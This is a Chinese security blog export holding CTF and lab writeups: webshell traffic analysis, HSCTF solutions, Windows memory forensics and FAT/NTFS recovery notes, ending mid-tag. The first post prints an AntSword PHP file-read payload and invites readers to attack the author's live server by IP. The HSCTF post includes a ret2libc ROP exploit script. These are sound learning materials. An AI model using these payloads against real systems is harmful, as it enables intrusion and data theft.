+<h1 id="1-抓包学习-用tcpdump抓包-plain-tcpdump-port-80-w-1-pcap-用前几天给计网老师搭的上传环境hh"><a href="#1-抓包学习-用tcpdump抓包-plain-tcpdump-port-80-w-1-pcap-用前几天给计网老师搭的上传环境hh" class="headerlink" title="1.抓包学习 用tcpdump抓包 plain tcpdump port 80 -w 1.pcap  用前几天给计网老师搭的上传环境hh"></a>1.抓包学习 用tcpdump抓包 <code>plain tcpdump port 80 -w 1.pcap </code> 用前几天给计网老师搭的上传环境hh</h1><p>传了一个一句话木马上去 <code>plain  </code> 包下来了，看一眼 直接追踪流，可以看到这个上传的文件 这个配置出了点小问题，影响不大。<br><img src="https://uploader.shimo.im/f/jxSAnDLI2eVEHlU6.png!thumbnail" alt="图片"><br>用蚁剑连一下子，再抓一下流量，可以看到这个流量<br><img src="https://uploader.shimo.im/f/uBOnf5waDD5EOh8j.png!thumbnail" alt="图片"> <code>plain /www/wwwroot/175.24.78.155/index.html&amp; value=@ini_set(&quot;display_errors&quot;, &quot;0&quot;); @set_time_limit(0); function asenc($out) &#123;return $out;&#125;; function asoutput()&#123; $output=ob_get_contents(); ob_end_clean(); echo &quot;21d6e540e0b3&quot;; echo @asenc($output); echo &quot;cb3cabef&quot;;&#125; ob_start(); try&#123; $F=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST[&quot;he75a2a982b4fc&quot;]):$_POST[&quot;he75a2a982b4fc&quot;]) ;$fp=@fopen($F,&quot;r&quot;); if(@fgetc($fp))&#123; @fclose($fp);@readfile($F); &#125; else &#123;echo (&quot;ERROR:// Can Not Read&quot;);&#125;; &#125;catch(Exception $e) &#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;; asoutput(); die(); </code><br>url解一下码，可以看到蚁剑是自动做了混淆的，这个还是很有用的。<br><a href="https://uploader.shimo.im/f/PD23wJmHCKwmj5UV.pacp">1.pacp</a><br>这个返回包的gzip，是编码过的，直接储存为zip文件再解密就能看到明文了。 把原始数据保存，转16进制<br><img src="https://uploader.shimo.im/f/FJpEyfAoGte4e2Xv.png!thumbnail" alt="图片"><br>接着把1f8b之前的删掉，再解压就可以了<br><img src="https://uploader.shimo.im/f/lIAQQlUbshMDALTi.png!thumbnail" alt="图片"> # 2.进一步利用的研究<br><a href="https://uploader.shimo.im/f/z9Ak9vNoRwQ6dEF7.pcap">3.pcap</a><br><img src="https://uploader.shimo.im/f/yzLy4pYzsKyWTUdd.png!thumbnail" alt="图片"><br>这里是抓取连接一句话木马利用的数据包 像这样的简单的，直接拿过来用就可以了，理解也很好理解 但是想蚁剑那种，做了混淆的应该怎么办呢，我直接把payload<br>copy下来 <img src="https://uploader.shimo.im/f/EdTh1Ig8nUwyx1Zd.png!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/QhFDic8z3mUX4DH2.png!thumbnail" alt="图片"> 可以看到，直接成功<br><img src="https://uploader.shimo.im/f/OaLz47JW1hbqSBdK.png!thumbnail" alt="图片"> 但是这个cat<br>flag的包，经过尝试，我并没有成功，是因为路径不一样，蚁剑用的绝对路径，在awd比赛的时候是不存在这种问题滴<br><img src="https://uploader.shimo.im/f/8sdRXgXnnOnoGGqC.png!thumbnail" alt="图片"> 不过包里是有flag的<br><img src="https://uploader.shimo.im/f/g70DaQSVlsRj8NE2.png!thumbnail" alt="图片"><br>这里面却没有。。。emmm应该问题不大<br><strong>各位大佬，我环境是给计网老师搭的，现在还没关，大佬们想日就日吧，求求别删东西，我数据库作业还在上面呢。又乖又怂.jpg</strong></p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HSCTF  WP   ——Lun4R</title>
+    <url>/2020/06/06/cnblog_13054815/</url>
+    <content><![CDATA[<h1 id="这是👉HSCTF-WP-——Lun4R👈的摘要"><a href="#这是👉HSCTF-WP-——Lun4R👈的摘要" class="headerlink" title="这是👉HSCTF  WP   ——Lun4R👈的摘要"></a><a href="../../../../2020/06/06/cnblog_13054815/">这是👉HSCTF  WP   ——Lun4R👈的摘要</a></h1><a id="more"></a>
+<p>-– title: HSCTF WP ——Lun4R date: 2020-06-06 categories: - wp tags: - HSCTF<br>-– 和小伙伴们一起做了一下HSCTF，这竟然是给高中举办的CTF比赛。MISC思路是非常新颖啊。。。  # MISC ## My First<br>Calculator <img src="https://uploader.shimo.im/f/QqKPsZcsk9QoP0SS.png!thumbnail" alt="图片"></p>
+<h2 id="CNC"><a href="#CNC" class="headerlink" title="CNC "></a>CNC <img src="https://uploader.shimo.im/f/oJX9xUKmJ5Oyuu9w.png!thumbnail" alt="图片"></h2><p>恢复数据，导出文件，在mp4最后发现part3 压缩包有密码，在表格中发现密码 passw0rd ## Glad Bags 一个ELF<br>发现7z压缩包，提取出来，发现是个项目emmm ## Mad Libs<br><img src="https://uploader.shimo.im/f/gCQ3yHE016r0Ritf.png!thumbnail" alt="图片"><br>stegsolve跑一遍发现红绿蓝色道最低位位平面上方存在隐写，data extract直接出flag<br><img src="https://uploader.shimo.im/f/VDts7MH7mppJVKAo.png!thumbnail" alt="图片"> ## Comments<br>下载下来是一个压缩包 <img src="https://uploader.shimo.im/f/AoTPxnnaoVrjAN11.png!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/wfymDqOcrJ76zqFr.png!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/QTG6iQLmVCEWMi3t.png!thumbnail" alt="图片"><br>一层压缩包注释就有一位flag ## Meta Mountains<br><img src="https://uploader.shimo.im/f/kWmKWIIIJ3UNeXY3.png!thumbnail" alt="图片"><br>查看图片属性直接拿flag ## N-95<br><img src="https://uploader.shimo.im/f/HiUy7vPK7doIDCzV.png!thumbnail" alt="图片"><br>修成这样以后就没得办法了……25 x 25应该是没跑的 直接去网站识别就行了，残缺的部分涂成灰的 ## Emojis <code>plain 😊♈🎤 😊♉🎤 😊♊🎤 😊♋🎤 😊♌🎤 😊♍🎤 😊♎🎤 😊♏🎤 😊♐🎤 😊♑🎤 😊♒🎤 😊♓🎤 😊🕙🎤 😵♉🕙 😈♓♈ 😵♉♍ 😊♊♏ 😈♉♌ 😇♑♎ 😵♌♑ 😊🕐♋ 😈♊💖 😊♋🕙 😊🕙🕐 😇♉♏ 😈♉♋ 😇♈♓ 😇♊💞 😇♋💕 😵♋♍ 😊🕕🎤 😵♌♑ 😇♌♑ 😇♓💜 😈♒💖 😇♏♐ 😈♍♎ 😵♒💞 😇♎♐ 😇♐💖 😈♈♊ 😈♌♓ 😇♊♊ 😈♏♓ 😵♒💔 😈♑♉ 😊📢♈ 😊📢♉ 😊📢♊ 😊📢♋ 😊📢♌ 😊📢♍ 😊📢♎ 😊📢♏ 😊📢♐ 😊📢♑ 😊📢♒ 😊📢♓ 😊📢🕙 </code> 深奥的编程语言。跟鬼一样。。。 我去找找 <code>plain https://www.emojicode.org/ 这个比较像c。。不是这个 </code><br><img src="https://uploader.shimo.im/f/1RZiS0VTtrximbYI.png!thumbnail" alt="图片"> <code>plain https://esolangs.org/wiki/Emoji https://github.com/vpzomtrrfrt/emoji.py 也不像 </code> <code>plain https://esolangs.org/wiki/DubDubMachine Brainfuck derivatives 还是不像 也不是 https://esolangs.org/wiki/EmojiCoder 找到了找到了 https://esolangs.org/wiki/Emoji-gramming </code><br><img src="https://uploader.shimo.im/f/Fo26D9RInbKpDm73.png!thumbnail" alt="图片"> 这24个是变量名<br>🎤是输入 📢是输出 <img src="https://uploader.shimo.im/f/hV4oTkynMYMs8DCq.png!thumbnail" alt="图片"><br>看逻辑 <code>plain if♉🕙 sub♓♈ if♉♍ MOV♊♏ sub♉♌ ADD♑♎ if♌♑ MOV🕐♋ sub♊8 MOV♋🕙 MOV🕙🕐 ADD♉♏ sub♉♋ ADD♈♓ ADD♊4 ADD♋2 if♋♍ MOV🕕🎤 if♌♑ ADD♌♑ ADD♓1 sub♒8 ADD♏♐ sub♍♎ if♒4 ADD♎♐ ADD♐8 sub♈♊ sub♌♓ ADD♊♊ sub♏♓ if♒0 sub♑♉ </code> 改成人稍微能看懂点的。。。 <code>plain a=input() b=input() c=input() d=input() e=input() f=input() g=input() h=input() i=input() j=input() k=input() l=input() E=input() if(b != E): l=l-a if(b != f): c=h b=b-e j=j+g if(e！=j): A=d c=c-8 d=E E=A b=b+h b=b-d a=a+1 c=c+4 d=d+2 #if(d!=f): if(e!=j): e=e+j l=l+1 k=k-8 h=h+i f=f-g if(k!=4): g=g+i i=i+8 a=a-c e=e-l c=c+c h=h-l if(k!=0): j=j-b #print(abcdefjhijklE) #xB^r_En&#125;INc4v </code> 逆算法 <code>python s=&quot;xB^r_En&#125;INc4v&quot; a=ord(s[0]) b=ord(s[1]) c=ord(s[2]) d=ord(s[3]) e=ord(s[4]) f=ord(s[5]) g=ord(s[6]) h=ord(s[7]) i=ord(s[8]) j=ord(s[9]) k=ord(s[10]) l=ord(s[11]) E=ord(s[12]) if(k!=0): j=j+b h=h+l c=c/2 e=e+l a=a+c i=i-8 #print(k) if(k!=4): g=g-i f=f+g h=h-i k=k+8 l=l-1 print(e,j) if(e-j!=j): e=e-j d=d-2 c=c-4 a=a-l b=b+d b=b-h A=E E=d d=A c=c+8 #print(e,f) j=j-g b=b+e #print(b,f) if(b!=f): h=c if(b!=E): l=l+a print(a,b,c,d,e,f,j,h,i,j,k,l,E) #116.0 69 51.0 118 3 114 99 51.0 65 99 107 167.0 112 </code> ## evil stego<br><img src="https://uploader.shimo.im/f/gLtNo25pGZAwNTBc.png!thumbnail" alt="图片"> 肯定找最简单的下手</p>
+<pre><code class="plain">base64 encoded! ``` 显然rot13 ```plain Lbh&#39;er trggvat NRF juvyr V bayI trg
+EBG13? You&#39;re getting AES while I onlV get ROT13? ``` # Pwn ## pwn1 直接NC ##
+pwn2 远程偏移0xd0 ## pwn3 from pwn import * from LibcSearcher import *
+#p=process(&#39;./pwnagotchi&#39;) context.log_level=&#39;debug&#39;
+p=remote(&#39;pwn.hsctf.com&#39;,5005) p.recvuntil(&#39;name: \n&#39;) pad=&#39;a&#39;*20
+pop_rdi=0x00000000004009f3 puts_plt=4195932 puts_got=6295576 main=0x400846
+func1=0x4007e7 func2=0x400801 #gdb.attach(p)
+payload=pad+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(func1)+p64(func2)+p64(main)
+p.sendline(payload) p.recvuntil(&#39;!\n&#39;) addr=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+libc = LibcSearcher(&#39;puts&#39;,addr) libc_base=addr-libc.dump(&#39;puts&#39;) print
+&quot;libc_base:&quot; +hex(libc_base) p.recvuntil(&#39;name: \n&#39;) #gdb.attach(p)
+payload2=pad+p64(libc_base+0x4f2c5)#one_gadget p.send(payload2)
+p.interactive() # re ## re1 c=&#39;inagzgkpm)Wl&amp;Tg;&amp;io;&#39; c1=&#39;&#39; for i in
+range(len(c)): c1+=chr(ord(c[i])+i) print (c1) c2=&#39;&#39; for b in range(len(c1)):
+for i in range(0x20,0x7e): if((i+len(str(int(i))))==ord(c1[b])): c2+=chr(i) ##
+print (c2)re2 ```java import java.util.Scanner; public class re &#123; public
+static void main(String[] args) &#123; String inp = &quot;1dd3|y_3tttb5g`q]^dhn3j&quot;; for
+(int i = 0; i &lt; 3; i++) &#123; inp = xor(inp); inp = re(inp); &#125;
+System.out.print(inp); &#125; public static String xor(String input) &#123; int[] xor =
+&#123;4, 1, 3, 1, 2, 1, 3, 0, 1, 4, 3, 1, 2, 0, 1, 4, 1, 2, 3, 2, 1, 0, 3&#125;; String
+ret = &quot;&quot;; for (int i = 0; i &lt; input.length(); i++) &#123; ret += (char)
+(input.charAt(i) ^ xor[i]); &#125; return ret; &#125; public static String re(String
+input) &#123; char[] arr=new char[23]; String ret = &quot;&quot;; int[] transpose =
+&#123;11,18,15,19,8,17,5,2,12,6,21,0,22,7,13,14,4,16,20,1,3,10,9&#125;; String flag =&quot;&quot;;
+for(int i=0;i&lt;23;i++)&#123; /*System.out.print(transpose[i]);*/ arr[transpose[i]]
+=input.charAt(i); &#125; System.out.print(arr); for (int a = 0; a&lt; 23; a++) &#123;
+System.out.print(a); ret+=arr[a] ; &#125; return ret; &#125; //flag&#123;n0t_t00_b4d_r1ght&#125;
+``` ## too-much 输入的数没有正负判断，导致下溢 from pwn import * context.log_level=&#39;debug&#39;
+p=remote(&#39;rev.hsctf.com&#39;,9001) p.interactive() #sned -1 -2 发送后会收到一大串内容
+，flag就在其中 #recv 102 108 97 103 123 116 111 111 95 109 117 99 104 95 116 111 95
+104 97 110 100 108 101 125 10 解密flag
+a=[102,108,97,103,123,116,111,111,95,109,117,99,104,95,116,111,95,104,97,110,100,108,101,125]
+flag=&#39;&#39; for i in range(len(a)): flag+=chr(a[i]) print(flag)
+#flag&#123;too_much_to_handle&#125; # Web ## Blurry Eyes
+![图片](https://uploader.shimo.im/f/rbf7zM3vy9qyL7sa.png!thumbnail) f12直接拿flag
+## Debt Simulator
+![图片](https://uploader.shimo.im/f/AMpgg6hcHEcg9Zr3.png!thumbnail)
+查看执行的js脚本发现每次Next Round都会向这个URL发出请求
+![图片](https://uploader.shimo.im/f/twB4Qc1iq0P7SHkM.png!thumbnail) 访问这个URL发现
+![图片](https://uploader.shimo.im/f/x8f8dVvBZ5pRv2le.png!thumbnail)
+在下一次发包时抓包，把func参数改getgetgetgetgetgetgetgetgetFlag即可拿到flag # CRYPT ## xorred
+```plain Key1 = 0x5dcec311ab1a88ff66b69ef46d4aba1aee814fe00a4342055c146533 a=
+0x9a13ea39f27a12000e083a860f1bd26e4a126e68965cc48bee3fa11b d=
+0x557ce6335808f3b812ce31c7230ddea9fb32bbaeaf8f0d4a540b4f05 c=
+0x7b33428eb14e4b54f2f4a3acaeab1c2733e4ab6bebc68436177128eb b =
+0x996e59a867c171397fc8342b5f9a61d90bda51403ff6326303cb865a e=
+0x306d34c5b6dda0f53c7a0f5a2ce4596cfea5ecb676169dd7d5931139 key3=Key1^a
+Key4=key3^b Key5=c^Key1^Key4 Key2=d^key3^Key5 flag=e^Key1^Key2^key3^Key4^Key5
+print(hex(flag)) ```
+
+</code></pre>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020网鼎杯白虎组 MISC 密码柜（未解出）</title>
+    <url>/2020/05/16/cnblog_12898784/</url>
+    <content><![CDATA[<h1 id="这是👉2020网鼎杯白虎组-MISC-密码柜（未解出）👈的摘要"><a href="#这是👉2020网鼎杯白虎组-MISC-密码柜（未解出）👈的摘要" class="headerlink" title="这是👉2020网鼎杯白虎组 MISC 密码柜（未解出）👈的摘要"></a><a href="../../../../2020/05/16/cnblog_12898784/">这是👉2020网鼎杯白虎组 MISC 密码柜（未解出）👈的摘要</a></h1><a id="more"></a>
+<h1 id="2020网鼎杯白虎组-MISC-密码柜-青龙组自闭misc手，过来看看白虎的题目。。-给了两个文件，一个镜像一个Database-kdbx"><a href="#2020网鼎杯白虎组-MISC-密码柜-青龙组自闭misc手，过来看看白虎的题目。。-给了两个文件，一个镜像一个Database-kdbx" class="headerlink" title="2020网鼎杯白虎组 MISC 密码柜 青龙组自闭misc手，过来看看白虎的题目。。 给了两个文件，一个镜像一个Database.kdbx"></a>2020网鼎杯白虎组 MISC 密码柜 青龙组自闭misc手，过来看看白虎的题目。。 给了两个文件，一个镜像一个Database.kdbx</h1><p>首先，这是一个win10的内存镜像，小菜鸡也是第一次见，因为win10特有的内存压缩机制，所以我的vol没法进行内存取证。。去搜了一下，知道了一个项目。是用来进行win10取证的,vol3应该也是支持的。</p>
+<blockquote>
+<p><a href="https://github.com/fireeye/win10_volatility">https://github.com/fireeye/win10_volatility</a><br>通过VOL查看进程和搜索，可以发现kdbx是keepass的数据库文件。keepass主要是用来储存密码的，数据库用一个密码来加密,从而达到安全的储存密码的目的，同时题目也提示密码柜，看来是这个东西了。<br>那么去找一下文件<br><img src="https://img2020.cnblogs.com/blog/1619455/202005/1619455-20200516092134023-777087109.png"><br>可以找到一个密码柜备份.txt &gt;密码柜的密码可不能忘了，毕竟那里面存着我最重要的东西 &gt;而且我走哪都要带着它 &gt;6s4mxkhvge<br><img src="https://img2020.cnblogs.com/blog/1619455/202005/1619455-20200516092148897-30140278.png"><br>有用的是这个第三个密码，是kgb压缩包的压缩密码，去搜索这个<strong>something.kge</strong>文件，将文件dump下来，用密码解开应该就可以了。这个版本vol我这里dump不下来，所以目前还没做出来，比赛的时候也是做到这里卡住了。具体也还没搞清楚。。<br>-—— 更新一下 <strong>有好多人问我txt是怎么dump下来的，我是通过取证大师的数据恢复功能恢复出文件看的（我承认我菜）</strong><br>用其他数据恢复软件或者直接去看文件应该也是可以的。 谢谢L1n3师傅的指点，师傅也已经解完这道题了。 ```<br><a href="https://writeup.ctfhub.com/Challenge/2020/%E7%BD%91%E9%BC%8E%E6%9D%AF/%E7%99%BD%E8%99%8E%E7%BB%84/828f7ab8.html">https://writeup.ctfhub.com/Challenge/2020/%E7%BD%91%E9%BC%8E%E6%9D%AF/%E7%99%BD%E8%99%8E%E7%BB%84/828f7ab8.html</a></p>
+</blockquote>
+<pre><code class="这个something,kge文件是通过kee导出的，右键选择import就可以了，我这里kgb怎么装都装不好，就不继续往下面做了">![](https://img2020.cnblogs.com/blog/1619455/202005/1619455-20200518223133752-34064948.png)
+估计也有不少人会有同款报错吧，，，
+
+</code></pre>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>数据恢复之FAT和NTFS</title>
+    <url>/2020/07/17/cnblog_13331754/</url>
+    <content><![CDATA[<h1 id="这是👉数据恢复之FAT和NTFS👈的摘要"><a href="#这是👉数据恢复之FAT和NTFS👈的摘要" class="headerlink" title="这是👉数据恢复之FAT和NTFS👈的摘要"></a><a href="../../../../2020/07/17/cnblog_13331754/">这是👉数据恢复之FAT和NTFS👈的摘要</a></h1><a id="more"></a>
+<p>放假了，把这个学期学到的东西整理出来发一下，主要是一些学习笔记和实验之类的。 如果有师弟用的到的话，不要感谢我，感谢楷哥和牟哥<br><img src="https://img2020.cnblogs.com/blog/1619455/202007/1619455-20200717181945570-1889109604.png"></p>
+<h1 id="FAT文件系统-文件系统-放个大佬写的吧，很详细了（平时学的时候我也没做笔记）"><a href="#FAT文件系统-文件系统-放个大佬写的吧，很详细了（平时学的时候我也没做笔记）" class="headerlink" title="FAT文件系统 ## 文件系统 放个大佬写的吧，很详细了（平时学的时候我也没做笔记）"></a>FAT文件系统 ## 文件系统 放个大佬写的吧，很详细了（平时学的时候我也没做笔记）</h1><p><a href="https://blog.csdn.net/li_wen01/article/details/79929730">https://blog.csdn.net/li_wen01/article/details/79929730</a></p>
+<h3 id="实验操作-DBR结构"><a href="#实验操作-DBR结构" class="headerlink" title="实验操作 DBR结构"></a>实验操作 DBR结构</h3><p><img src="https://uploader.shimo.im/f/F55SUAypobvhxxs3.png!thumbnail" alt="图片"> 总扇区号 8465232<br>每扇区512 每个簇8个扇区 DBR的保留扇区数：34 FAT的个数：2 FAT的扇区数：8251<br><img src="https://uploader.shimo.im/f/b59CK1EYPBsp0y9W.png!thumbnail" alt="图片"><br>Fat2=fat1+fat扇区数 = 34+8251=8285<br><img src="https://uploader.shimo.im/f/8jSYVy5XhWp4e3Xo.png!thumbnail" alt="图片"><br>FDT的位置：=34+2<em>8251=16536<br><img src="https://uploader.shimo.im/f/YnFWgkNFxCxSrhBm.png!thumbnail" alt="图片"> 扔了一个png进去<br><img src="https://uploader.shimo.im/f/8vQIvJxNIWyegtho.png!thumbnail" alt="图片"><br>名称相同。起始簇号0000 0005<br><img src="https://uploader.shimo.im/f/H6lkU49boLr2Giac.png!thumbnail" alt="图片"><br>在fat1找到文件，结束簇号是300 16536+（5-2）</em>8=16560扇区 跳到5号簇，可以看到PNG文件头<br><img src="https://uploader.shimo.im/f/FR1iTKO7UQCvYFMB.png!thumbnail" alt="图片"> 结束簇号 删除文件<br><img src="https://uploader.shimo.im/f/cAeWmGMkzJOpaxeP.png!thumbnail" alt="图片"> 簇表回到原来<br>目录项第一个字节变为E5，其他没有改变<br><img src="https://uploader.shimo.im/f/A6XbzxoL4vdI8uMM.png!thumbnail" alt="图片"><br>数据区没变，把文件直接复制出来<br><img src="https://uploader.shimo.im/f/5f9ZLCCva7TN0Mcx.png!thumbnail" alt="图片"><br>这个是簇号按顺序排列的时候，如果未按顺序，应该按照FAT表项的簇表顺序排列文件内容。<br><img src="https://uploader.shimo.im/f/9YQrDmZYJUvTsqZd.png!thumbnail" alt="图片"> 恢复成功<br><img src="https://uploader.shimo.im/f/xjgZtnYuZY0lyKNx.png!thumbnail" alt="图片"> 用0000覆盖目录区<br>用取证大师成功恢复。。。 <img src="https://uploader.shimo.im/f/wqQ9TW9d7iUiLj7g.png!thumbnail" alt="图片"><br>连我格式化之前的好多东西都恢复出来了，，，<br><img src="https://uploader.shimo.im/f/g315rQKxP73Gl3Fe.png!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/odRDVji6bO816d7J.png!thumbnail" alt="图片"> 再把图片扔进去，删掉。。<br>就覆盖一个图片头吧 <img src="https://uploader.shimo.im/f/Ob0y4Da5qAUUBDAh.png!thumbnail" alt="图片"><br>嗯，用取证大师没恢复出来，按理说目录里应该有这个文件的吧<br><img src="https://uploader.shimo.im/f/Kyzyv0NTd3OO6ml2.png!thumbnail" alt="图片"> 创建一个文件夹和子文件夹<br><img src="https://uploader.shimo.im/f/Or0og1GHdgKWBSuy.png!thumbnail" alt="图片"> 创建时间毫秒 A2<br>创建时间 61 87 ‭10000 （16）111011 （59）00001 （1） 16.59.1‬ 创建日期 0101000 0101 00010‬<br>2020.5.2 最后访问日期 0101000 0101 00010‬ 2020.5.2 最后修改时间 62 87 ‭10000 （16）111011<br>（59）00010 （2） 16.59.2‬ 最后修改日期 0101000 0101 00010‬ 2020.5.2 文件夹大小为0， 起始簇号0000<br>0005还是在5号簇，把文件扔进去<br><img src="https://uploader.shimo.im/f/cDRymJ9961MuqBzy.png!thumbnail" alt="图片"><br>有一个Son子目录，上级目录在0号簇，根目录 创建时间毫秒 9c 创建时间 65 87 ‭10000 （16）111011 （59）00101 （5）‬<br>创建日期 0101000 0101 00010‬ 2020.5.2 最后访问日期 A2 50 0101000 0101 00010‬ 2020.5.2<br>最后修改时间 66 87 10000 （16）111011 （59）00110 （6）‬ 最后修改日期 A2 50 ‭0101000 0101 00010‬<br>2020.5.2 文件夹大小为0， 簇号 0000 0006 在6号簇，跳到6号 可以看到2E2E的上级目录在5号簇，就是刚刚那个<br>有个1.jpg，簇号132（16）=306（10）在306簇<br><img src="https://uploader.shimo.im/f/BwSMup4tjnXnAqUN.png!thumbnail" alt="图片"> ## 隐藏文件 创建文件<br>在底层找到文件 <img src="https://uploader.shimo.im/f/awkzbWMWjMZdM6pg.png!thumbnail" alt="图片"><br>放到DBR区 <img src="https://uploader.shimo.im/f/L5FNHmfc9omDMzAp.png!thumbnail" alt="图片"><br>放到fat区中 <img src="https://uploader.shimo.im/f/CuvXA4oZxMp3uaQG.png!thumbnail" alt="图片"><br>放到dir中 <img src="https://uploader.shimo.im/f/yaSkJ1Ehd0STuk35.png!thumbnail" alt="图片"><br>data区中 <img src="https://uploader.shimo.im/f/pT2zMZiZOx4drJUS.png!thumbnail" alt="图片"> 覆盖掉文件<br><img src="https://uploader.shimo.im/f/DoV0yLig4wRIWKx2.png!thumbnail" alt="图片"> dir也覆盖掉<br><img src="https://uploader.shimo.im/f/Njsa8U96CYmxrlc0.png!thumbnail" alt="图片"> 看不见文件了<br>上面几个位置的内容还在 但是新建文件后把文件内容覆盖了一半，再新建文件还出错。<br><img src="https://uploader.shimo.im/f/Z6n89wmGL5Fli0XI.png!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/y4Yviiseq4gQFwV7.png!thumbnail" alt="图片"> 把这个内容删了 fat区<br>只会从之后开始写， <img src="https://uploader.shimo.im/f/lijw2g3J6dipE1iH.png!thumbnail" alt="图片"><br>新建文件，把簇改成坏簇 <img src="https://uploader.shimo.im/f/l9xFO1jaLC53APun.png!thumbnail" alt="图片"><br>删掉dir，文件里看不到了，内容还在坏簇里<br><img src="https://uploader.shimo.im/f/98zC77cr46fTtcI7.png!thumbnail" alt="图片"> ## DBR恢复<br>先查看MBR分区表 <img src="https://uploader.shimo.im/f/4akxICaxD3NcK3pZ.png!thumbnail" alt="图片"><br>-————-第1个分区—————– 000203000C210E138000000000B00400 00<br>020300 磁头号 00000010 2 扇区号 000000 0 柱面号 1100000000 768 0C 210E13 磁头号 00100001<br>33 扇区号 000011 3 柱面号 1000010011 531 地址 00000080 16 =( 128 )10 大小 0004B000 16 =(<br>307200 )10 -————-第2个分区—————–<br>00210F1307FE3F4B80B0040000F80D00 00 210F13 磁头号 00100001 33 扇区号 000011 3 柱面号<br>1100010011 787 07 FE3F4B 磁头号 11111110 254 扇区号 001111 15 柱面号 1101001011 843 地址<br>0004B080 16 =( 307328 )10 大小 000DF800 16 =( 915456 )10<br>跳到128号扇区,查看第一个分区,这应该是损害的FAT分区,分区的DBR被覆盖.<br><img src="https://uploader.shimo.im/f/5x9d5w3AnK4NXKBe.png!thumbnail" alt="图片"> 修复DBR<br>先看看备份DBR怎么样了,备份DBR也被覆盖<br><img src="https://uploader.shimo.im/f/ipZTSwr3aLe1vSYd.png!thumbnail" alt="图片"> 恢复DBR,需要<br>保留扇区数,FAT表个数(通常为2),每FAT表大小扇区数,根目录簇号(通常为2号簇),每扇区数,分区前隐含扇区数及分区大小扇区数.<br>找一下FAT表,搜索”F8FFFF”,这是FAT1<br><img src="https://uploader.shimo.im/f/x47UrGSok9CaW64f.png!thumbnail" alt="图片"> 这是FAT2<br><img src="https://uploader.shimo.im/f/WZPAtQhQZRpmdeUB.png!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/RpGzd1iwXsRcbdlJ.png!thumbnail" alt="图片"><br>7735-7150=585扇区 FAT1大小为585扇区 7150-128 = 7,022 保留扇区 7022扇区<br>根目录应该在7735+585=8,320扇区<br><img src="https://uploader.shimo.im/f/kHcju4dtrfU1j1QG.png!thumbnail" alt="图片"><br>通过子目录每簇扇区数,查找”2E20202020202020202020”（就是”.”,表示本目录）<br><img src="https://uploader.shimo.im/f/yhTdK5VrppmcoXxP.png!thumbnail" alt="图片"><br>这里有一个,这个目录在8324扇区,目录显示在0x00000003号,既3号簇 根目录在2号簇 (8324-8320)/(3-2)=4 既每簇4扇区<br>找一个FAT分区的DBR,重构DBR<br><img src="https://uploader.shimo.im/f/iIAlQm9jugUPfTAN.png!thumbnail" alt="图片"> # NtFS ##<br>文件系统 <a href="https://blog.csdn.net/enjoy5512/article/details/50935972/">NTFS文件系统详解</a><br>属性:NTFS中,所有与数据相关的信息都被称为属性,如文件名属性,时间属性,文件内容被称为数据属性.<br>元文件:NTFS文件系统被创建时,同时会建立一些重要的系统信息,用来管理文件系统,这些系统信息是以文件的形式存在的,被称为元文件,以$符号开头,是系统隐藏文件,用户不可直接访问.<br>Dir也不能查看. 逻辑簇号：既对分区内的第一个簇到最后一个簇进行编号，NTFS使用逻辑簇号对簇进行定位。<br>虚拟簇号：既将文件所占用的簇从开头到尾进行编号的，虚拟簇号不要求在物理上是连续的。 ### 实验操作 查看$BOOT<br><img src="https://uploader.shimo.im/f/Dzo9ILR0TnzrpelQ.png!thumbnail" alt="图片"> 每扇区大小 512字节<br>每簇大小 8 扇区 每磁头扇区数 63 每柱面磁头数 255 隐藏扇区数 64 分区大小 8465231簇 $MFT的开始簇号 262144簇<br>$MFTmirr开始簇号 2 262144<em>4096=1073741824 跳转到 262144簇<br><img src="https://uploader.shimo.im/f/0OQP1PyYUZGL2JLk.png!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/rkUlvhLkFvwfJgff.png!thumbnail" alt="图片"> 根目录在$MFT<br>第6个文件记录，偏移是1024</em>5=5120 1073741824+5120 = ‭1073746944‬ 1073780736 找到文件<br><img src="https://uploader.shimo.im/f/kSgP1OQ7zAlOmZmU.png!thumbnail" alt="图片"> 80 属性为常驻属性<br>修改文件，加大文件 <img src="https://uploader.shimo.im/f/eGF2PqZQzliWbiZQ.png!thumbnail" alt="图片"><br>80属性变为非常驻属性 runlist 0x31 01 c3d804 位置 0x04d8c3 = ‭317635‬ 跳到317635簇<br><img src="https://uploader.shimo.im/f/GmihDaEAo5Q4XzAt.png!thumbnail" alt="图片"> 找到文件内容 删除此文件<br><img src="https://uploader.shimo.im/f/HmMvQFReZx2QBjRE.png!thumbnail" alt="图片"> 文件头 0x10 位 从<br>0x0100 变成了 0x20000,加了1，表示文件被删除 创建文件夹 找到根目录<br><img src="https://uploader.shimo.im/f/PsUig3zvTLo0udp0.png!thumbnail" alt="图片"> 0x31 01<br>D72B08 0x082BD7=4284088 跳到 4284088簇 找到根目录<br><img src="https://uploader.shimo.im/f/SCdpA1Oranm3oDZ2.png!thumbnail" alt="图片"> 找到文件加的索引<br><img src="https://uploader.shimo.im/f/Uvh3OtrXUe1h3uKA.png!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/krDiWo1bKnnE8oWZ.png!thumbnail" alt="图片"> 0x26=38<br>跳到38编号 <img src="https://uploader.shimo.im/f/WSteTT2y2SV8NTtf.png!thumbnail" alt="图片"> 0x2f<br>= 47 跳到47编号 <img src="https://uploader.shimo.im/f/kzgtbHQ87tzixWHU.png!thumbnail" alt="图片"><br>找到文件 0x2e = 46 跳到46<br><img 